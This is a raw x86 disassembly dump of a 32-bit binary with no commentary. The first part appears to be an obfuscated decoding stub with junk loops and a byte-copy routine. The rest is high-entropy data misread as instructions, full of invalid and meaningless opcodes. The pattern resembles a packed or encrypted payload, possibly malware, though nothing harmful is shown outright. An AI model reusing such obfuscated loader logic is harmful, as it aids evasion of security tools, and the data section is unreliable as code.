  41d24f:	mov    eax,ds:0x42634d
  41d254:	mov    ds:0x426355,eax
  41d259:	mov    eax,ds:0x4262c9
  41d25e:	push   0x4
  41d260:	add    eax,0x1cc
  41d265:	push   eax
  41d266:	lea    eax,[esp+0x2c]
  41d26a:	push   eax
  41d26b:	call   0x41d27f
  41d270:	mov    eax,DWORD PTR [esp+0x24]
  41d274:	mov    eax,DWORD PTR [eax]
  41d276:	pop    edi
  41d277:	pop    esi
  41d278:	pop    ebx
  41d279:	mov    esp,ebp
  41d27b:	pop    ebp
  41d27c:	ret    0xc
  41d27f:	push   ebp
  41d280:	mov    ebp,esp
  41d282:	sub    esp,0x10
  41d285:	mov    eax,ds:0x427c81
  41d28a:	mov    ecx,DWORD PTR ds:0x429d45
  41d290:	sub    eax,ecx
  41d292:	add    eax,DWORD PTR [eax+ecx*1]
  41d295:	mov    eax,0xf89c85b5
  41d29a:	and    DWORD PTR ds:0x426eb9,ecx
  41d2a0:	mov    DWORD PTR [ebp-0x4],eax
  41d2a3:	and    DWORD PTR ds:0x426f29,0x0
  41d2ad:	mov    edx,DWORD PTR ds:0x426f29
  41d2b3:	inc    edx
  41d2b4:	mov    DWORD PTR ds:0x426f29,edx
  41d2ba:	cmp    DWORD PTR ds:0x426f29,0xc
  41d2c1:	jge    0x41d300
  41d2c7:	jmp    0x41d2d7
  41d2cc:	push   0x4f6e
  41d2d1:	call   DWORD PTR ds:0x430a2c
  41d2d7:	cmp    DWORD PTR ds:0x426f29,0xb
  41d2de:	jne    0x41d2f3
  41d2e4:	xor    edx,edx
  41d2e6:	add    edx,DWORD PTR ds:0x426f29
  41d2ec:	inc    edx
  41d2ed:	mov    DWORD PTR ds:0x426f29,edx
  41d2f3:	cmp    DWORD PTR ds:0x426f29,0x14
  41d2fa:	jb     0x41d2ad
  41d300:	mov    DWORD PTR [ebp-0x8],0xf89c85b4
  41d307:	mov    edx,DWORD PTR ds:0x426ee9
  41d30d:	sbb    DWORD PTR ds:0x426f21,edx
  41d313:	mov    ecx,DWORD PTR [ebp-0x4]
  41d316:	mov    DWORD PTR ds:0x426ebd,0x1b
  41d320:	cmp    DWORD PTR ds:0x426ebd,0x0
  41d327:	je     0x41d371
  41d32d:	cmp    DWORD PTR ds:0x426ebd,0x2
  41d334:	jg     0x41d371
  41d33a:	jmp    0x41d345
  41d33f:	call   DWORD PTR ds:0x430a38
  41d345:	cmp    DWORD PTR ds:0x426ebd,0x3
  41d34c:	jne    0x41d35f
  41d352:	mov    edx,DWORD PTR ds:0x426ebd
  41d358:	dec    edx
  41d359:	mov    DWORD PTR ds:0x426ebd,edx
  41d35f:	mov    edx,DWORD PTR ds:0x426ebd
  41d365:	dec    edx
  41d366:	mov    DWORD PTR ds:0x426ebd,edx
  41d36c:	jmp    0x41d320
  41d371:	push   esi
  41d372:	or     edx,0x1404
  41d378:	mov    edx,0x75108b3
  41d37d:	mov    esi,DWORD PTR ds:0x426eb5
  41d383:	and    DWORD PTR ds:0x426e95,esi
  41d389:	xor    ecx,edx
  41d38b:	xor    esi,DWORD PTR ds:0x426eb9
  41d391:	mov    esi,0x3272fa
  41d396:	push   edi
  41d397:	xor    DWORD PTR ds:0x426ec5,0xe12
  41d3a1:	mov    edi,DWORD PTR [ebp+0x10]
  41d3a4:	add    ecx,esi
  41d3a6:	mov    DWORD PTR ds:0x426f09,0x182c
  41d3b0:	cmp    ecx,edi
  41d3b2:	je     0x41d4a2
  41d3b8:	mov    ecx,DWORD PTR [ebp-0x4]
  41d3bb:	movzx  edi,WORD PTR ds:0x426f09
  41d3c2:	add    DWORD PTR ds:0x426ea5,edi
  41d3c8:	mov    edi,DWORD PTR [ebp+0x10]
  41d3cb:	xor    eax,eax
  41d3cd:	xor    ecx,edx
  41d3cf:	add    ecx,esi
  41d3d1:	add    DWORD PTR ds:0x426ed1,0x330a
  41d3db:	add    edi,0xfabdbecd
  41d3e1:	mov    DWORD PTR ds:0x426ee5,0x5f33
  41d3eb:	adc    eax,0xffffffff
  41d3ee:	and    DWORD PTR ds:0x426ecd,0x4eeb
  41d3f8:	xor    eax,0x0
  41d3fb:	mov    DWORD PTR [ebp-0xc],eax
  41d3fe:	push   ebx
  41d3ff:	xor    ebx,ebx
  41d401:	xor    edi,0x8a29a147
  41d407:	mov    eax,ecx
  41d409:	add    eax,0xfabdbecd
  41d40e:	adc    ebx,0xffffffff
  41d411:	xor    eax,0x8a29a147
  41d416:	xor    ebx,0x0
  41d419:	cmp    eax,edi
  41d41b:	jne    0x41d434
  41d421:	cmp    ebx,DWORD PTR [ebp-0xc]
  41d424:	je     0x41d49c
  41d42a:	jmp    0x41d434
  41d42f:	mov    esi,0x3272fa
  41d434:	mov    eax,DWORD PTR [ebp-0x4]
  41d437:	mov    edi,DWORD PTR [ebp-0x8]
  41d43a:	xor    edi,edx
  41d43c:	add    edi,esi
  41d43e:	mov    esi,DWORD PTR [ebp+0x8]
  41d441:	imul   edi,ecx
  41d444:	mov    ebx,DWORD PTR [ebp+0xc]
  41d447:	xor    eax,edx
  41d449:	add    eax,ecx
  41d44b:	mov    al,BYTE PTR [ebx+eax*1+0x3272fa]
  41d452:	mov    BYTE PTR [edi+esi*1],al
  41d455:	mov    eax,DWORD PTR [ebp-0x8]
  41d458:	mov    esi,DWORD PTR [ebp+0x10]
  41d45b:	xor    eax,edx
  41d45d:	xor    ebx,ebx
  41d45f:	add    esi,0xfabdbecd
  41d465:	adc    ebx,0xffffffff
  41d468:	lea    ecx,[ecx+eax*1+0x3272fa]
  41d46f:	xor    edi,edi
  41d471:	xor    esi,0x8a29a147
  41d477:	xor    ebx,0x0
  41d47a:	mov    eax,ecx
  41d47c:	add    eax,0xfabdbecd
  41d481:	adc    edi,0xffffffff
  41d484:	xor    eax,0x8a29a147
  41d489:	xor    edi,0x0
  41d48c:	cmp    eax,esi
  41d48e:	jne    0x41d42f
  41d494:	cmp    edi,ebx
  41d496:	jne    0x41d42f
  41d49c:	mov    eax,0xf89c85b4
  41d4a1:	pop    ebx
  41d4a2:	pop    edi
  41d4a3:	pop    esi
  41d4a4:	leave  
  41d4a5:	ret    0xc
  41d4a8:	push   ebp
  41d4a9:	mov    ebp,esp
  41d4ab:	push   ecx
  41d4ac:	and    DWORD PTR ds:0x426e8d,0x0
  41d4b6:	mov    eax,ds:0x426e8d
  41d4bb:	inc    eax
  41d4bc:	mov    ds:0x426e8d,eax
  41d4c1:	cmp    DWORD PTR ds:0x426e8d,0x1c
  41d4c8:	jge    0x41d4eb
  41d4ce:	jmp    0x41d4de
  41d4d3:	push   0x5eb6
  41d4d8:	call   DWORD PTR ds:0x430a3c
  41d4de:	cmp    DWORD PTR ds:0x426e8d,0x1a
  41d4e5:	jb     0x41d4b6
  41d4eb:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  41d4f2:	neg    DWORD PTR ds:0x426e9d
  41d4f8:	mov    eax,DWORD PTR [ebp+0x8]
  41d4fb:	or     ecx,edx
  41d4fd:	movsx  eax,BYTE PTR [eax]
  41d500:	sub    ecx,ecx
  41d502:	jmp    0x41f875
  41d507:	ret    0x203
  41d50a:	add    BYTE PTR [edx-0x7e],0x42
  41d50e:	inc    ebx
  41d50f:	cmc    
  41d510:	in     al,0x42
  41d512:	sub    BYTE PTR [ecx],dl
  41d514:	adc    eax,0xfe625d0f
  41d519:	jp     0x41d596
  41d51b:	rcr    DWORD PTR [ebx+edi*2+0x4b8c4b7b],1
  41d522:	and    eax,0x7e1ac2cd
  41d527:	retf   
  41d528:	and    al,0x83
  41d52a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d52b:	or     BYTE PTR [ecx+0x40],dl
  41d52e:	(bad)  
  41d52f:	adc    eax,0x1f1416da
  41d534:	mov    esp,0x69fcd9e0
  41d539:	mov    DWORD PTR [ebx],esi
  41d53b:	mov    ds:0x21875059,eax
  41d540:	sub    al,0xa3
  41d542:	scas   al,BYTE PTR es:[edi]
  41d543:	cmp    eax,0x4f5238b4
  41d548:	inc    ecx
  41d549:	lea    ecx,[ebp+ebp*1-0x12378db6]
  41d550:	dec    ebx
  41d551:	pop    ds
  41d552:	pop    edx
  41d553:	and    DWORD PTR [edi+0x45d9d176],edx
  41d559:	mov    bh,0x78
  41d55b:	xchg   ebp,eax
  41d55c:	daa    
  41d55d:	jmp    0x41d567
  41d55f:	cmp    edx,DWORD PTR [ecx]
  41d561:	test   BYTE PTR [edx+0x1d],0x4d
  41d565:	cmp    edx,eax
  41d567:	ins    BYTE PTR es:[edi],dx
  41d568:	jp     0x41d5c7
  41d56a:	inc    ebx
  41d56b:	inc    ebp
  41d56c:	cmp    eax,0x62ec35e7
  41d571:	cmc    
  41d572:	sbb    dl,dh
  41d574:	mov    esi,0x2ad90d5e
  41d579:	jbe    0x41d54b
  41d57b:	sbb    DWORD PTR [edi+0x18],eax
  41d57e:	xchg   ebx,eax
  41d57f:	sbb    ebx,ebp
  41d581:	retf   0x1b9
  41d584:	sti    
  41d585:	jnp    0x41d526
  41d587:	add    ecx,ecx
  41d589:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d58a:	xchg   esi,eax
  41d58b:	sbb    eax,DWORD PTR [esp+ebx*8+0x5e3e70b8]
  41d592:	push   esp
  41d593:	(bad)  [esi-0x2058875c]
  41d599:	fimul  WORD PTR [ebx+0x60]
  41d59c:	add    ebp,DWORD PTR [ebx]
  41d59e:	push   0x3d9cb5e7
  41d5a3:	fs int 0xed
  41d5a6:	cli    
  41d5a7:	retf   
  41d5a8:	dec    edx
  41d5a9:	add    edx,0xf2274cf5
  41d5af:	daa    
  41d5b0:	mov    ebp,0xedc43f9a
  41d5b5:	fimul  DWORD PTR [edi]
  41d5b7:	pop    ss
  41d5b8:	add    eax,0xde339515
  41d5bd:	mov    esp,0x371538d8
  41d5c2:	ins    DWORD PTR es:[edi],dx
  41d5c3:	ja     0x41d5e7
  41d5c5:	pushf  
  41d5c6:	pop    edx
  41d5c7:	enter  0x49a7,0xba
  41d5cb:	push   ecx
  41d5cc:	sub    ch,BYTE PTR [esi-0x7eb0de7b]
  41d5d2:	jg     0x41d5e8
  41d5d4:	mov    dl,0x21
  41d5d6:	ds mov edx,0x1d966cce
  41d5dc:	sbb    DWORD PTR [edx-0x52],esp
  41d5df:	icebp  
  41d5e0:	mov    ebx,edi
  41d5e2:	arpl   WORD PTR [edi],cx
  41d5e4:	pop    edx
  41d5e5:	cld    
  41d5e6:	das    
  41d5e7:	cmp    eax,0xef90fd7b
  41d5ec:	sub    DWORD PTR [edi],esp
  41d5ee:	int3   
  41d5ef:	jnp    0x41d5cd
  41d5f1:	fnstcw WORD PTR [ecx]
  41d5f3:	(bad)  
  41d5f4:	jge    0x41d5a5
  41d5f6:	mov    eax,0xa4019277
  41d5fb:	sub    DWORD PTR [ebp+0x1d],0xffffffe2
  41d5ff:	adc    eax,0x23b5dfd
  41d604:	jns    0x41d644
  41d606:	fistp  DWORD PTR ds:0x5c5eac
  41d60c:	adc    ch,cl
  41d60e:	iret   
  41d60f:	ins    BYTE PTR es:[edi],dx
  41d610:	cmp    eax,0x43140a40
  41d615:	mov    al,ds:0x940a0120
  41d61a:	jbe    0x41d694
  41d61c:	pusha  
  41d61d:	ja     0x41d680
  41d61f:	push   ds
  41d620:	xchg   esp,eax
  41d621:	mov    dl,0x28
  41d623:	sar    DWORD PTR [edi+0x3cd53e40],cl
  41d629:	push   ds
  41d62a:	outs   dx,BYTE PTR ds:[esi]
  41d62b:	sti    
  41d62c:	lahf   
  41d62d:	arpl   WORD PTR [ebp+0x22],si
  41d630:	mov    ebx,0x7e57abef
  41d635:	adc    eax,0x18579192
  41d63a:	js     0x41d5c3
  41d63c:	pop    edx
  41d63d:	in     eax,0xfb
  41d63f:	ja     0x41d658
  41d641:	mov    BYTE PTR [eax],0xce
  41d644:	mov    dl,0x76
  41d646:	sbb    ecx,DWORD PTR [edx-0x623d45e8]
  41d64c:	ins    DWORD PTR es:[edi],dx
  41d64d:	jg     0x41d5ef
  41d64f:	inc    edx
  41d650:	sbb    bl,bh
  41d652:	xor    ecx,DWORD PTR [edi-0x2fa4b7]
  41d658:	mov    ch,0xb7
  41d65a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d65b:	jne    0x41d616
  41d65d:	mov    ds:0x677a4598,al
  41d662:	fwait
  41d663:	jns    0x41d674
  41d665:	rol    BYTE PTR [eax-0x4dc53b63],1
  41d66b:	popf   
  41d66c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d66d:	push   ebp
  41d66e:	lock or eax,0x6afeb76d
  41d674:	call   0xc441:0x7cac4c46
  41d67b:	mov    BYTE PTR [ebx+0x26],bl
  41d67e:	and    eax,0x3ae5db9e
  41d683:	icebp  
  41d684:	mov    ecx,0xbfbd5c18
  41d689:	cmp    DWORD PTR [edx+0x6f],eax
  41d68c:	les    ebx,FWORD PTR [esi+ecx*1+0x39]
  41d690:	scas   eax,DWORD PTR es:[edi]
  41d691:	(bad)  
  41d692:	mov    ecx,0xfa464a36
  41d697:	lods   eax,DWORD PTR ds:[esi]
  41d698:	and    bh,bh
  41d69a:	cld    
  41d69b:	leave  
  41d69c:	daa    
  41d69d:	pop    edx
  41d69e:	popf   
  41d69f:	inc    DWORD PTR [ecx+0x62]
  41d6a2:	push   ds
  41d6a3:	dec    ebx
  41d6a4:	xor    BYTE PTR ds:0x972e325,bh
  41d6aa:	nop
  41d6ab:	xchg   ebp,eax
  41d6ac:	mov    ds:0xe0dd1bcc,eax
  41d6b1:	leave  
  41d6b2:	nop
  41d6b3:	mov    ebp,0xde1da207
  41d6b8:	add    al,0x2f
  41d6ba:	inc    esi
  41d6bb:	retf   
  41d6bc:	jne    0x41d6d9
  41d6be:	sub    ecx,DWORD PTR ds:0xfc58f3ee
  41d6c4:	shl    DWORD PTR [ecx+0x45],cl
  41d6c7:	aas    
  41d6c8:	ret    
  41d6c9:	in     al,0xe4
  41d6cb:	rol    DWORD PTR [eax+eiz*8-0xe],cl
  41d6cf:	imul   edi,DWORD PTR [edx+0x7c],0x71d0916d
  41d6d6:	je     0x41d707
  41d6d8:	sub    al,0xe3
  41d6da:	aad    0xdc
  41d6dc:	push   ds
  41d6dd:	add    esi,0xffffff86
  41d6e0:	jmp    0x41d754
  41d6e2:	icebp  
  41d6e3:	(bad)  
  41d6e4:	pop    esp
  41d6e5:	inc    esp
  41d6e6:	test   al,0x8a
  41d6e8:	jg     0x41d74e
  41d6ea:	jl     0x41d710
  41d6ec:	addr16 daa 
  41d6ee:	jb     0x41d6fb
  41d6f0:	adc    eax,0xe2ab1140
  41d6f5:	out    dx,eax
  41d6f6:	jg     0x41d6f5
  41d6f8:	and    eax,0xe4f01f73
  41d6fd:	pop    ebx
  41d6fe:	cmc    
  41d6ff:	test   al,0x84
  41d701:	stos   DWORD PTR es:[edi],eax
  41d702:	sbb    eax,0x52d8a159
  41d707:	inc    ebp
  41d708:	xchg   BYTE PTR [ecx-0x7f],cl
  41d70b:	push   ss
  41d70c:	mov    bh,0x1b
  41d70e:	neg    BYTE PTR [ecx]
  41d710:	mov    BYTE PTR [edx*4-0x419499e4],0x3f
  41d718:	(bad)  
  41d719:	mov    ah,0x5
  41d71b:	push   ecx
  41d71c:	call   0x1667:0x265c8f17
  41d723:	out    0xfb,al
  41d725:	mov    esi,0xcb3fb2ed
  41d72a:	repnz xor DWORD PTR [edi+eax*2+0x3c1a5c5e],edi
  41d732:	leave  
  41d733:	dec    edx
  41d734:	dec    ecx
  41d735:	sub    eax,0x549431bc
  41d73a:	jae    0x41d6d9
  41d73c:	push   0x1e7ef956
  41d741:	xor    ah,BYTE PTR [ebx]
  41d743:	sahf   
  41d744:	fwait
  41d745:	repnz and DWORD PTR [ebx-0x6e],ebp
  41d749:	fisubr DWORD PTR [ebp+eax*2+0x42]
  41d74d:	push   esp
  41d74e:	mov    dh,0x4e
  41d750:	inc    ebx
  41d751:	shl    BYTE PTR [ecx],0x9
  41d754:	in     al,0xbf
  41d756:	adc    DWORD PTR [edx+0x43e9e1ea],0x94adfa98
  41d760:	sbb    eax,0xdcba4131
  41d766:	pop    esi
  41d767:	bound  esi,QWORD PTR [edi+0x6e77dd4]
  41d76d:	ret    0x7862
  41d770:	mov    al,0x88
  41d772:	in     al,dx
  41d773:	loope  0x41d7af
  41d775:	stc    
  41d776:	mov    esp,0x2702f99e
  41d77b:	adc    eax,0xb0c39ef2
  41d780:	jno    0x41d724
  41d782:	sbb    bh,BYTE PTR [eax]
  41d784:	stc    
  41d785:	test   BYTE PTR [ecx+edi*2],cl
  41d788:	repnz mov bh,0x2
  41d78b:	stos   DWORD PTR es:[edi],eax
  41d78c:	mov    ah,0x13
  41d78e:	mov    al,ds:0x29a68e1e
  41d793:	jmp    0x2e50:0x20a1fd08
  41d79a:	(bad)
  41d79e:	pop    edx
  41d79f:	repnz ffree st(7)
  41d7a2:	adc    DWORD PTR [eax],0x81ea0c25
  41d7a8:	outs   dx,DWORD PTR ds:[esi]
  41d7a9:	int3   
  41d7aa:	lods   eax,DWORD PTR ds:[esi]
  41d7ab:	jb     0x41d827
  41d7ad:	inc    ebx
  41d7ae:	das    
  41d7af:	retf   
  41d7b0:	scas   eax,DWORD PTR es:[edi]
  41d7b1:	xor    BYTE PTR [ebp+0x0],cl
  41d7b4:	inc    edx
  41d7b5:	cli    
  41d7b6:	cmp    eax,0xb6282886
  41d7bb:	xchg   edx,eax
  41d7bc:	test   eax,0xa19cd92a
  41d7c1:	test   al,0x2
  41d7c3:	pushf  
  41d7c4:	sub    eax,0xe6eaf0b5
  41d7c9:	pop    esp
  41d7ca:	ins    DWORD PTR es:[edi],dx
  41d7cb:	in     al,dx
  41d7cc:	loope  0x41d7f8
  41d7ce:	loopne 0x41d764
  41d7d0:	cmp    DWORD PTR [ebp+0x4],0x4b
  41d7d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d7d5:	ret    
  41d7d6:	inc    ecx
  41d7d7:	sub    al,dh
  41d7d9:	jns    0x41d7d0
  41d7db:	xor    ebp,DWORD PTR [edx]
  41d7dd:	push   ds
  41d7de:	fild   DWORD PTR [edi]
  41d7e0:	mov    edi,0x2936d9de
  41d7e5:	jl     0x41d7c7
  41d7e7:	inc    esi
  41d7e8:	push   edx
  41d7e9:	adc    ebx,DWORD PTR [ecx+edx*1]
  41d7ec:	adc    dh,BYTE PTR [edi]
  41d7ee:	sub    al,0x90
  41d7f0:	test   al,0xf8
  41d7f2:	into   
  41d7f3:	scas   eax,DWORD PTR es:[edi]
  41d7f4:	pop    ebx
  41d7f5:	xlat   BYTE PTR ds:[ebx]
  41d7f6:	adc    DWORD PTR [eax],esp
  41d7f8:	repnz mov ch,0x9b
  41d7fb:	sbb    eax,0xc9947eb9
  41d800:	pop    ds
  41d801:	mov    eax,0x7a931891
  41d806:	call   0xd08ec23a
  41d80b:	mov    cs,WORD PTR [ebx+eax*2+0x4ba7e46f]
  41d812:	clc    
  41d813:	rcr    BYTE PTR [ecx],1
  41d815:	les    esp,FWORD PTR [esi-0x41]
  41d818:	push   ecx
  41d819:	imul   ebx,ebx,0xffffffa7
  41d81c:	aad    0x94
  41d81e:	cmp    eax,DWORD PTR [esi-0x60]
  41d821:	mov    al,0xf8
  41d823:	sbb    edi,edi
  41d825:	fimul  DWORD PTR [edx+0x5b]
  41d828:	not    ch
  41d82a:	cld    
  41d82b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d82c:	xchg   ebp,eax
  41d82d:	inc    ecx
  41d82e:	mov    ah,0x92
  41d830:	aam    0x25
  41d832:	xchg   ebp,eax
  41d833:	dec    esp
  41d834:	jne    0x41d807
  41d836:	sub    al,0x6b
  41d838:	inc    edx
  41d839:	push   ds
  41d83a:	dec    edx
  41d83b:	icebp  
  41d83c:	in     eax,dx
  41d83d:	(bad)  
  41d83e:	lods   eax,DWORD PTR ds:[esi]
  41d83f:	cwde   
  41d840:	add    eax,0xcce38266
  41d845:	adc    al,0xc3
  41d847:	add    ch,BYTE PTR [edi-0x23]
  41d84a:	xor    ebx,ebx
  41d84c:	gs push edi
  41d84e:	(bad)  
  41d84f:	aas    
  41d850:	and    BYTE PTR [ecx+0x20],dh
  41d853:	pop    esp
  41d854:	mov    esi,0x33aaff01
  41d859:	pop    ecx
  41d85a:	call   0x662f:0xb6a3f56a
  41d861:	fwait
  41d862:	scas   al,BYTE PTR es:[edi]
  41d863:	and    BYTE PTR [eax-0x47],bh
  41d866:	cmp    al,0xf
  41d868:	and    BYTE PTR [ebp+0x4aee0993],dh
  41d86e:	add    dh,BYTE PTR [edx]
  41d870:	mov    al,ds:0x25e9d110
  41d875:	adc    DWORD PTR [esi-0x60c4ded],0x9a70c575
  41d87f:	mov    edi,0xb29bd574
  41d884:	fstp   QWORD PTR [ebx+0x66]
  41d887:	jge    0x41d8e0
  41d889:	mov    ds,WORD PTR [esi-0x3a5c3478]
  41d88f:	mov    ds:0xbed4cc8d,al
  41d894:	retf   0xb464
  41d897:	stc    
  41d898:	add    ecx,DWORD PTR [ebp+0xbf7ef64]
  41d89e:	mov    bh,0xd6
  41d8a0:	cld    
  41d8a1:	cwde   
  41d8a2:	add    ah,ch
  41d8a4:	sbb    al,0x7f
  41d8a6:	ja     0x41d8de
  41d8a8:	sbb    DWORD PTR [esi+0x2b1ccb97],edx
  41d8ae:	enter  0x5217,0x5a
  41d8b2:	jbe    0x41d877
  41d8b4:	enter  0x69c3,0x52
  41d8b8:	push   eax
  41d8b9:	iret   
  41d8ba:	sbb    bh,BYTE PTR [ecx+0xeb84126]
  41d8c0:	mov    esp,0x28476122
  41d8c5:	add    eax,0x1a55d2c4
  41d8ca:	ins    DWORD PTR es:[edi],dx
  41d8cb:	cmp    ecx,DWORD PTR [ebx+esi*1+0x19]
  41d8cf:	xor    al,0xa5
  41d8d1:	(bad)  
  41d8d2:	jecxz  0x41d91e
  41d8d4:	jmp    0x53b5:0xe81afe94
  41d8db:	(bad)  
  41d8dc:	dec    esi
  41d8dd:	xchg   esp,eax
  41d8de:	mov    dh,0x6a
  41d8e0:	into   
  41d8e1:	push   eax
  41d8e2:	repz dec ebx
  41d8e4:	jg     0x41d872
  41d8e6:	dec    edx
  41d8e7:	(bad)  
  41d8e8:	mov    ds:0x6ce3c9ce,al
  41d8ed:	repz cmp cl,BYTE PTR [ecx-0xa2aaf05]
  41d8f4:	cmp    dh,0xf8
  41d8f7:	lahf   
  41d8f8:	sbb    esi,DWORD PTR cs:[eax+0x36b5a80e]
  41d8ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d900:	cmp    al,0x3b
  41d902:	das    
  41d903:	out    0x25,eax
  41d905:	xchg   esp,eax
  41d906:	dec    ecx
  41d907:	jns    0x41d8dd
  41d909:	jae    0x41d92c
  41d90b:	or     al,0x12
  41d90d:	or     eax,0x6618b738
  41d912:	dec    eax
  41d913:	and    dh,BYTE PTR [esi+edx*4-0x32]
  41d917:	xlat   BYTE PTR ds:[ebx]
  41d918:	adc    DWORD PTR [ebx+0x40],eax
  41d91b:	gs push ebx
  41d91d:	dec    BYTE PTR [edi-0x79]
  41d920:	dec    ebp
  41d921:	inc    eax
  41d922:	dec    edi
  41d923:	test   eax,0xb09d4d13
  41d928:	stos   BYTE PTR es:[edi],al
  41d929:	adc    edi,DWORD PTR [ebx-0x4505dc5f]
  41d92f:	loop   0x41d97c
  41d931:	pop    eax
  41d932:	pop    ds
  41d933:	or     al,0x96
  41d935:	sbb    BYTE PTR [edx+0x22],ch
  41d938:	add    al,0xa4
  41d93a:	shl    BYTE PTR ds:0xb4c5c631,0x5e
  41d941:	je     0x41d903
  41d943:	lahf   
  41d944:	ins    DWORD PTR es:[edi],dx
  41d945:	add    ebx,ecx
  41d947:	cmp    cl,BYTE PTR [ebp+0x12]
  41d94a:	push   DWORD PTR [ecx+0x60b995f6]
  41d950:	bound  edi,QWORD PTR ss:[ebp-0x6b95905f]
  41d957:	imul   BYTE PTR [ebx+0x3aa28fbc]
  41d95d:	idiv   DWORD PTR ds:[edx]
  41d960:	arpl   ax,dx
  41d962:	jne    0x41d922
  41d964:	xchg   ecx,eax
  41d965:	in     al,dx
  41d966:	xchg   edx,eax
  41d967:	dec    edx
  41d968:	jo     0x41d95f
  41d96a:	xor    al,0x45
  41d96c:	add    al,0x2f
  41d96e:	mov    bh,0x3c
  41d970:	xor    eax,0xce4dac72
  41d975:	test   ebx,esp
  41d977:	or     DWORD PTR [ecx+0x17],edx
  41d97a:	aaa    
  41d97b:	cmc    
  41d97c:	jmp    0x41d9a7
  41d97e:	rol    BYTE PTR [eax-0x42bab3b0],1
  41d984:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d985:	test   al,0x95
  41d987:	inc    ebx
  41d988:	jno    0x41d979
  41d98a:	clc    
  41d98b:	data16 repnz out dx,al
  41d98e:	jae    0x41d9b0
  41d990:	xchg   cl,bh
  41d992:	push   0xe0461477
  41d997:	loopne 0x41d92e
  41d999:	cli    
  41d99a:	mul    bh
  41d99c:	test   DWORD PTR [esi-0x152f986e],ecx
  41d9a2:	retf   0xc2cf
  41d9a5:	push   cs
  41d9a6:	add    cl,BYTE PTR [eax]
  41d9a8:	dec    esi
  41d9a9:	jp     0x41d9d3
  41d9ab:	daa    
  41d9ac:	pop    eax
  41d9ad:	fnstcw WORD PTR ss:[eax-0x118ded39]
  41d9b4:	iret   
  41d9b5:	or     eax,0x756fe78f
  41d9ba:	dec    edx
  41d9bb:	loope  0x41d99f
  41d9bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d9be:	sbb    ebp,DWORD PTR [edi-0x75cc1f7]
  41d9c4:	retf   
  41d9c5:	es pop eax
  41d9c7:	mov    ds:0x9290f151,al
  41d9cc:	dec    esi
  41d9cd:	mov    cl,0xe7
  41d9cf:	xchg   edx,eax
  41d9d0:	(bad)  
  41d9d1:	xchg   esp,eax
  41d9d2:	jp     0x41da42
  41d9d4:	js     0x41d975
  41d9d6:	mov    fs,ecx
  41d9d8:	pop    es
  41d9d9:	mov    ds:0x5e4dec54,al
  41d9de:	test   ah,bl
  41d9e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d9e1:	cmc    
  41d9e2:	inc    esi
  41d9e3:	out    0x28,al
  41d9e5:	dec    ebp
  41d9e6:	addr16 push ebx
  41d9e8:	adc    eax,0xa55b0542
  41d9ed:	lds    esp,FWORD PTR [edi]
  41d9ef:	test   al,0xc7
  41d9f1:	(bad)  
  41d9f2:	int3   
  41d9f3:	push   ss
  41d9f4:	cdq    
  41d9f5:	pop    ecx
  41d9f6:	and    eax,0x645d07c9
  41d9fc:	adc    ebx,DWORD PTR [esp+eiz*4+0x1e7d5858]
  41da03:	aam    0x15
  41da05:	add    BYTE PTR [eax],dh
  41da07:	jmp    0x41da2a
  41da09:	loope  0x41d9fa
  41da0b:	dec    esp
  41da0c:	or     eax,0xf02c6e8
  41da11:	pusha  
  41da12:	mov    ebx,DWORD PTR [ecx+0x764d6a55]
  41da18:	pop    esi
  41da19:	and    edi,DWORD PTR [esi+0x55]
  41da1c:	and    ch,bl
  41da1e:	inc    esp
  41da1f:	shl    DWORD PTR [esi+0x2c],0x6e
  41da23:	cmp    BYTE PTR [edi+ecx*2],dl
  41da26:	jne    0x41d9f2
  41da28:	pop    esi
  41da29:	xchg   esi,eax
  41da2a:	inc    edx
  41da2b:	adc    BYTE PTR [eax-0x3a],ch
  41da2e:	add    al,0x33
  41da30:	inc    ecx
  41da31:	adc    BYTE PTR [esi],dh
  41da33:	inc    esi
  41da34:	dec    ecx
  41da35:	xor    dh,dl
  41da37:	inc    eax
  41da38:	xor    ah,BYTE PTR ds:0x6c0b72d
  41da3e:	jecxz  0x41d9f0
  41da40:	fwait
  41da41:	push   edx
  41da42:	push   eax
  41da43:	pop    ebp
  41da44:	fwait
  41da45:	jecxz  0x41da57
  41da47:	mov    bl,0xc4
  41da49:	sub    BYTE PTR [eax+0x4513f401],dh
  41da4f:	xchg   edi,eax
  41da50:	fist   WORD PTR [ecx]
  41da52:	dec    edi
  41da53:	xor    eax,0x78d248f2
  41da58:	dec    esi
  41da59:	jbe    0x41da30
  41da5b:	mov    eax,0x29f281b3
  41da60:	add    BYTE PTR [ecx],ch
  41da62:	fiadd  WORD PTR [ebp+0x1b]
  41da65:	dec    ebx
  41da66:	sub    BYTE PTR [ebx-0x7c],bh
  41da69:	mov    edx,0xf075be12
  41da6e:	adc    al,0x1f
  41da70:	(bad)  
  41da71:	mov    al,0x3
  41da73:	mov    al,BYTE PTR [edx+0x12]
  41da76:	rcr    DWORD PTR ds:0x55a88eb3,1
  41da7c:	aad    0x4c
  41da7e:	sub    DWORD PTR [edi-0x57a03a5a],edx
  41da84:	xchg   ebp,eax
  41da85:	push   es
  41da86:	loope  0x41da81
  41da88:	mov    edx,0x825d8713
  41da8d:	add    DWORD PTR [ecx+0x21],edi
  41da90:	popa   
  41da91:	(bad)  
  41da92:	mul    BYTE PTR ds:0x928b63dd
  41da98:	iret   
  41da99:	xor    dl,BYTE PTR [edi-0x61]
  41da9c:	setp   BYTE PTR [ebx+ebp*8]
  41daa0:	das    
  41daa1:	inc    edi
  41daa2:	cmc    
  41daa3:	div    dl
  41daa5:	adc    ecx,DWORD PTR [edx+eiz*8+0x5f]
  41daa9:	jbe    0x41db0f
  41daab:	mov    ebx,0x433a2f31
  41dab0:	pop    es
  41dab1:	add    al,0x62
  41dab3:	popa   
  41dab4:	fisttp WORD PTR [edx-0x1023adaa]
  41daba:	sbb    BYTE PTR [edx+0x7b74c72c],cl
  41dac0:	add    cl,bh
  41dac2:	out    dx,eax
